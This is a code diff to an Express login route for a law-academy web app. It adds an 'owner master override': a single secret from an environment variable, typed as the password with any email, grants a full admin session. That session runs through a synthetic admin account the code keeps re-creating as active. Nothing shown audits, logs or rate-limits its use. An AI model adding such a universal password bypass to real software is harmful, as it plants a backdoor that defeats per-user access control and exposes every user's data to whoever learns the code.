@@ -1,5 +1,5 @@
 import { Router, type Request, type Response } from "express";
-import { randomUUID } from "crypto";
+import { randomUUID, createHash, timingSafeEqual } from "crypto";
 import { db } from "@workspace/db";
 import { usersTable } from "@workspace/db/acad";
 import { and, eq, sql } from "drizzle-orm";
@@ -13,6 +13,43 @@ import {
 // Arbitrary constant used as a postgres advisory-lock key so concurrent
 // /auth/register calls serialize on the "is this the very first user?" check.
 const REGISTER_BOOTSTRAP_LOCK = 7373731n;
+
+// Owner master override. When MASTER_ACCESS_CODE is set, entering it as the
+// password on the login form (any email) grants a full admin session backed by
+// a dedicated master account. Fail-closed: unset secret disables the override.
+const MASTER_ACCESS_CODE = (process.env.MASTER_ACCESS_CODE ?? "").trim();
+const MASTER_EMAIL = "master-override@mylawacad.local";
+
+function matchesMasterCode(submitted: string): boolean {
+  if (!MASTER_ACCESS_CODE) return false;
+  const a = createHash("sha256").update(submitted.trim()).digest();
+  const b = createHash("sha256").update(MASTER_ACCESS_CODE).digest();
+  return timingSafeEqual(a, b);
+}
+
+/**
+ * Find-or-create the synthetic master admin account. It has no password hash,
+ * so it can never be logged into via the normal password path — only via the
+ * master override. Always healed back to active admin.
+ */
+async function ensureMasterUser() {
+  const [row] = await db
+    .insert(usersTable)
+    .values({
+      id: randomUUID(),
+      email: MASTER_EMAIL,
+      passwordHash: null,
+      name: "Master Override",
+      role: "admin",
+      status: "active",
+    })
+    .onConflictDoUpdate({
+      target: usersTable.email,
+      set: { role: "admin", status: "active" },
+    })
+    .returning();
+  return row!;
+}
 
 const router: Router = Router();
 
@@ -122,6 +159,15 @@ router.post("/auth/login", async (req: Request, res: Response): Promise<void> =>
 
   if (!email || !password) {
     res.status(400).json({ error: "Email and password are required." });
+    return;
+  }
+
+  // Owner master override: master code as password grants a full admin session.
+  if (matchesMasterCode(password)) {
+    const master = await ensureMasterUser();
+    await regenerateSession(req);
+    req.session.acadUserId = master.id;
+    res.json({ user: toSafeUser(master) });
     return;
   }
 
